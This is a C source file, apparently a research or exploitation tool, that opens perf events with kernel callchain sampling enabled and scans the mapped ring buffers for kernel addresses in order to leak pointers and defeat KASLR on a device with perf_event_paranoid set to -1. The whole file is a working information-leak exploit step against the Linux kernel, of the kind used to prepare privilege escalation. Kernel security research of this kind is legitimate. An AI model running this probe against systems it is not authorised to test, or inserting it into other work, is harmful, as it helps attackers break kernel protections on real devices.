/*
 * perf_kaslr_leak.c - use perf_event_open with tracepoints to leak kernel pointers
 * perf_event_paranoid=-1 on this device means no restrictions.
 * kptr_restrict=2 means %p output is hashed, but perf callchain behavior
 * depends on the kernel's perf_callchain_user() implementation.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/perf_event.h>
#include <signal.h>

#ifndef __NR_perf_event_open
#define __NR_perf_event_open 241
#endif

static long perf_event_open(struct perf_event_attr *attr, pid_t pid,
                            int cpu, int group_fd, unsigned long flags) {
    return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
}

static int has_kernel_addr(uint64_t val) {
    /* Canonical kernel addresses: top 16 bits all 1 */
    if ((val >> 48) == 0xffff) {
        /* Reject P0/direct-map (0xffffff80...) */
        uint32_t hi32 = (uint32_t)(val >> 32);
        if (hi32 >= 0xffffff80 && hi32 <= 0xffffff8f)
            return 0;  /* P0 direct-map, not canonical text */
        return 1;
    }
    return 0;
}

static void scan_buffer(const void *buf, size_t size, const char *label) {
    const uint64_t *p = (const uint64_t *)buf;
    size_t count = size / sizeof(uint64_t);
    for (size_t i = 0; i < count; i++) {
        if (p[i] != 0 && has_kernel_addr(p[i])) {
            printf("  LEAK[%s] offset=0x%zx val=0x%016llx\n",
                   label, i * 8, (unsigned long long)p[i]);
        }
    }
}

/* Read tracepoint ID from sysfs */
static int read_tracepoint_id(const char *category, const char *event) {
    char path[256];
    snprintf(path, sizeof(path),
             "/sys/kernel/tracing/events/%s/%s/id", category, event);
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    char buf[32] = {0};
    read(fd, buf, sizeof(buf) - 1);
    close(fd);
    return atoi(buf);
}

/* Test 1: tracepoint-based perf with callchain sampling */
static int test_tracepoint_callchain(const char *cat, const char *evt) {
    int id = read_tracepoint_id(cat, evt);
    if (id < 0) {
        printf("  tracepoint %s:%s not available\n", cat, evt);
        return -1;
    }

    struct perf_event_attr attr;
    memset(&attr, 0, sizeof(attr));
    attr.type = PERF_TYPE_TRACEPOINT;
    attr.size = sizeof(attr);
    attr.config = id;
    attr.sample_type = PERF_SAMPLE_CALLCHAIN | PERF_SAMPLE_STACK_USER | PERF_SAMPLE_REGS_USER;
    attr.sample_stack_user = 4096;
    attr.sample_regs_user = (1ULL << 31) | (1ULL << 32); /* SP + PC on aarch64 */
    attr.disabled = 1;
    attr.exclude_kernel = 0;
    attr.exclude_hv = 1;
    attr.wakeup_events = 1;

    int fd = perf_event_open(&attr, 0, -1, -1, 0);
    if (fd < 0) {
        printf("  perf_event_open(%s:%s) failed: %s (errno=%d)\n",
               cat, evt, strerror(errno), errno);
        return -1;
    }

    /* mmap the ring buffer */
    size_t mmap_size = getpagesize() * 64;
    void *ring = mmap(NULL, mmap_size, PROT_READ, MAP_SHARED, fd, 0);
    if (ring == MAP_FAILED) {
        printf("  mmap failed: %s\n", strerror(errno));
        close(fd);
        return -1;
    }

    /* Enable */
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);

    /* Trigger some activity */
    volatile int x = 0;
    for (int i = 0; i < 1000; i++) x += i;

    /* Disable */
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

    /* Read ring buffer */
    struct perf_event_mmap_page *header = (struct perf_event_mmap_page *)ring;
    uint64_t data_head = header->data_head;
    uint64_t data_tail = header->data_tail;
    printf("  ring buffer: head=%llu tail=%llu\n",
           (unsigned long long)data_head, (unsigned long long)data_tail);

    /* Scan ring buffer for kernel pointers */
    size_t data_offset = getpagesize();
    size_t data_size = data_head - data_tail;
    if (data_size > 0 && data_size < mmap_size - data_offset) {
        scan_buffer((char *)ring + data_offset, data_size, cat);
    }

    /* Also scan the user stack samples in the ring buffer */
    if (data_size > 0) {
        /* Walk through perf sample records */
        char *base = (char *)ring + data_offset;
        size_t pos = 0;
        int sample_count = 0;
        while (pos + sizeof(struct perf_event_header) < data_size) {
            struct perf_event_header *hdr = (struct perf_event_header *)(base + pos);
            if (hdr->size == 0 || pos + hdr->size > data_size) break;
            if (hdr->type == PERF_RECORD_SAMPLE) {
                sample_count++;
                /* The sample data follows the header.
                 * Layout: IP, ... based on sample_type.
                 * With PERF_SAMPLE_CALLCHAIN: nr (u64), then ips[nr]
                 * We just scan the whole sample for kernel pointers */
                scan_buffer(base + pos + sizeof(*hdr),
                           hdr->size - sizeof(*hdr), "sample");
            }
            pos += hdr->size;
        }
        printf("  samples found: %d\n", sample_count);
    }

    munmap(ring, mmap_size);
    close(fd);
    return 0;
}

/* Test 2: software event with stack dump */
static int test_sw_event_stack(void) {
    struct perf_event_attr attr;
    memset(&attr, 0, sizeof(attr));
    attr.type = PERF_TYPE_SOFTWARE;
    attr.size = sizeof(attr);
    attr.config = PERF_COUNT_SW_CPU_CLOCK;
    attr.sample_type = PERF_SAMPLE_CALLCHAIN | PERF_SAMPLE_STACK_USER;
    attr.sample_stack_user = 8192;
    attr.sample_period = 100000;
    attr.disabled = 1;
    attr.exclude_kernel = 0;
    attr.wakeup_events = 1;

    int fd = perf_event_open(&attr, 0, -1, -1, 0);
    if (fd < 0) {
        printf("  SW event failed: %s (errno=%d)\n", strerror(errno), errno);
        return -1;
    }

    size_t mmap_size = getpagesize() * 64;
    void *ring = mmap(NULL, mmap_size, PROT_READ, MAP_SHARED, fd, 0);
    if (ring == MAP_FAILED) {
        close(fd);
        return -1;
    }

    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    /* Burn CPU to generate samples */
    volatile uint64_t sum = 0;
    for (int i = 0; i < 10000000; i++) sum += i;
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

    struct perf_event_mmap_page *header = ring;
    uint64_t data_head = header->data_head;
    uint64_t data_tail = header->data_tail;
    printf("  SW ring: head=%llu tail=%llu\n",
           (unsigned long long)data_head, (unsigned long long)data_tail);

    size_t data_size = data_head - data_tail;
    if (data_size > 0 && data_size < mmap_size - getpagesize()) {
        scan_buffer((char *)ring + getpagesize(), data_size, "SW-CALLCHAIN");
    }

    munmap(ring, mmap_size);
    close(fd);
    return 0;
}

/* Test 3: Try PERF_SAMPLE_ADDR (data address sampling) */
static int test_data_addr_sample(void) {
    struct perf_event_attr attr;
    memset(&attr, 0, sizeof(attr));
    attr.type = PERF_TYPE_HARDWARE;
    attr.size = sizeof(attr);
    attr.config = PERF_COUNT_HW_CACHE_REFERENCES;
    attr.sample_type = PERF_SAMPLE_ADDR | PERF_SAMPLE_CALLCHAIN;
    attr.sample_period = 1000;
    attr.disabled = 1;
    attr.exclude_kernel = 0;
    attr.precise_ip = 2; /* request PEBS-like precise sampling */

    int fd = perf_event_open(&attr, 0, -1, -1, 0);
    if (fd < 0) {
        printf("  HW DATA_ADDR failed: %s (errno=%d)\n", strerror(errno), errno);
        return -1;
    }

    size_t mmap_size = getpagesize() * 64;
    void *ring = mmap(NULL, mmap_size, PROT_READ, MAP_SHARED, fd, 0);
    if (ring == MAP_FAILED) { close(fd); return -1; }

    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    volatile int arr[256];
    for (int i = 0; i < 1000000; i++) arr[i & 255] = i;
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

    struct perf_event_mmap_page *header = ring;
    uint64_t data_size = header->data_head - header->data_tail;
    if (data_size > 0 && data_size < mmap_size - getpagesize()) {
        scan_buffer((char *)ring + getpagesize(), data_size, "HW-ADDR");
    }
    printf("  HW DATA_ADDR: data_size=%llu\n", (unsigned long long)data_size);

    munmap(ring, mmap_size);
    close(fd);
    return 0;
}

int main(void) {
    printf("=== perf KASLR leak probe ===\n");
    printf("perf_event_paranoid from getconf: checking...\n");
    FILE *f = popen("cat /proc/sys/kernel/perf_event_paranoid 2>/dev/null", "r");
    if (f) {
        char buf[16] = {0};
        if (fgets(buf, sizeof(buf), f))
            printf("perf_event_paranoid = %s", buf);
        pclose(f);
    }

    printf("\n--- Test 1: Tracepoint + callchain ---\n");
    /* Try several tracepoints */
    const char *tps[][2] = {
        {"sched", "sched_switch"},
        {"sched", "sched_waking"},
        {"sched", "sched_process_exit"},
        {"sched", "sched_pi_setprio"},
        {"irq", "irq_handler_entry"},
        {"task", "task_rename"},
        {NULL, NULL}
    };
    for (int i = 0; tps[i][0]; i++) {
        printf("[%s:%s]\n", tps[i][0], tps[i][1]);
        test_tracepoint_callchain(tps[i][0], tps[i][1]);
    }

    printf("\n--- Test 2: SW CPU clock + callchain + stack ---\n");
    test_sw_event_stack();

    printf("\n--- Test 3: HW cache refs + data addr ---\n");
    test_data_addr_sample();

    printf("\nDone.\n");
    return 0;
}
